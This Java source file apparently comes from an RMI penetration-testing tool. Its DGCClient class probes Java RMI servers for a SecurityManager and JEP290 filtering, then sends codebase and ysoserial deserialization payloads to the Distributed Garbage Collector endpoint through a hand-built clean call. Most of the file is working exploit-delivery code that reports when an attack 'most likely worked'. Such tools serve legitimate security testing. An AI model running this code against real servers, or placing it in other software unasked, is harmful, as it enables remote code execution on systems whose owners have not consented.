package de.qtc.rmg.operations;

import java.io.IOException;
import java.net.SocketException;
import java.rmi.UnknownHostException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteRef;
import java.util.HashMap;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;

@SuppressWarnings("restriction")
public class DGCClient {

    private RMIWhisperer rmi;
    private static final long interfaceHash = -669196253586618813L;


    public DGCClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void enumSecurityManager()
    {
        try {
            Logger.printlnBlue("RMI server SecurityManager enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(new DefinitelyNonExistingClass());

        } catch( Exception e ) {

            Throwable t = RMGUtils.getThrowable("ClassNotFoundException", e);

            if( t == null ) {
                Logger.eprintlnYellow("- Caught unexpected exception during SecurityManager enumeration");
                Logger.eprintln("  Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

            else if( t.getMessage().contains("no security manager: RMI class loader disabled") ) {
                Logger.printlnMixedYellow("- RMI server", "does not", "use a SecurityManager.");
                Logger.printMixedYellow("  Remote class loading attacks", "are not", "possible");
                Logger.printlnPlainYellow(" (not vulnerable)");
                RMGUtils.showStackTrace(e);

            } else if( t.getMessage().contains("access to class loader denied") ) {
                Logger.printMixedYellow("- RMI server", "does", "use a SecurityManager.");
                Logger.printlnPlainMixedYellow(" But access to the class loader", "is denied.");
                Logger.println("  This is usually the case when the DGC uses a separate secuirty policy.");
                Logger.print("  Codebase attacks may work on the application level");
                Logger.printlnPlainYellow(" (maybe vulnerable)");
                RMGUtils.showStackTrace(e);

            } else if( t.getMessage().equals("de.qtc.rmg.operations.DGCClient$DefinitelyNonExistingClass")) {
                Logger.printMixedYellow("- RMI server", "does", "use a SecurityManager and");
                Logger.printlnPlainMixedYellow(" access to the class loader", "is allowed.");
                Logger.println("  Exploitability depends on the security policy of the RMI server and the setting");
                Logger.printMixedBlue("  of", "useCodebaseOnly", "during DGC operations");
                Logger.printlnPlainYellow(" (maybe vulnerable)");
                RMGUtils.showStackTrace(e);
            }

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void enumJEP290()
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(new HashMap<String,String>());

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is installed)");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is not installed)");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintln("Caught unexpcted exception during JEP290 enumeration.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    public void codebaseCleanCall(Object payload)
    {
        String className = payload.getClass().getName();

        try {
            Logger.printlnBlue("Attempting codebase attack on DGC endpoint...");
            Logger.print("Sending serialized class ");
            Logger.printlnPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(payload);

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.eprintMixedYellow("DGC", "rejected", "deserialization of class ");
                Logger.printPlainBlue(className + ".");
                Logger.printlnPlainYellow(" (JEP290 is installed)");
                Logger.eprintln("Codebase attacks may work at the appliaction layer.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("The attacking class could", "not be loaded", "from the specified endpoint.");
                Logger.eprintMixedBlue("The DGC is probably configured with", "useCodeBaseOnly=true");
                Logger.printlnPlainYellow(" (not vulnerable)");
                Logger.eprintlnMixedYellow("or the file", className + ".class", "was not found on the specified endpoint.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printlnMixedYellow("Caught", "ClassCastException", "during dgc-codebase action.");
                Logger.printlnMixedYellowFirst("Codebase attack", "most likely", "worked :)");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.security.AccessControlException) {
                Logger.printlnMixedYellow("Caught unexpected", "AccessControlException", "during dgc-codebase action.");
                Logger.printlnMixedBlue("The servers", "SecurityManager", "may refused the operation.");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during dgc-codebase action.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    public void attackCleanCall(Object payload)
    {
        try {
            Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(payload);

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.eprintMixedYellow("DGC", "rejected", "deserialization of the supplied gadget");
                Logger.printlnPlainYellow(" (JEP290 is installed)");
                Logger.eprintln("Codebase attacks may work at the appliaction layer.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("DGC", "accepted", "deserialization of the supplied gadget.");
                Logger.eprintlnMixedYellow("However, the gadget seems", "not", "to be available on the rmi server.");
                Logger.eprintln("Try a different gadget.");
                RMGUtils.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printlnMixedYellow("Caught", "ClassCastException", "during deserialization attack.");
                Logger.printlnMixedYellowFirst("Deserialization attack", "most likely", "worked :)");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.eprintln("Caught unexpcted exception during dgc-codebase action.");
                Logger.eprintln("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }

    /**
     * Make a call to the Distributed Garbage Collector (DGC) of an RMI endpoint.
     *
     * @param hostname the targeted hostname where the rmiregistry is located
     * @param port the
     * @param payloadObject
     * @throws Exception
     * @throws IOException
     * @throws UnknownHostException
     * @throws SocketException
     */
    @SuppressWarnings("deprecation")
    public void cleanCall(Object payloadObject) throws Exception
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
            try {
                java.io.ObjectOutput out = call.getOutputStream();
                out.writeObject(new ObjID[] {});
                out.writeLong(0L);
                out.writeObject(payloadObject);
                out.writeBoolean(true);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during cleanCall operation.");
                Logger.eprintMixedBlue("Target", "refused", "the connection.");
                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during cleanCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during cleanCall operation.");
                Logger.eprintln("Have you entered the correct target?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during cleanCall operation.");
                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                Logger.printlnPlainBlue(" SSL socket.");
                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during cleanCall operation.");
                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during cleanCall operation.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }
}
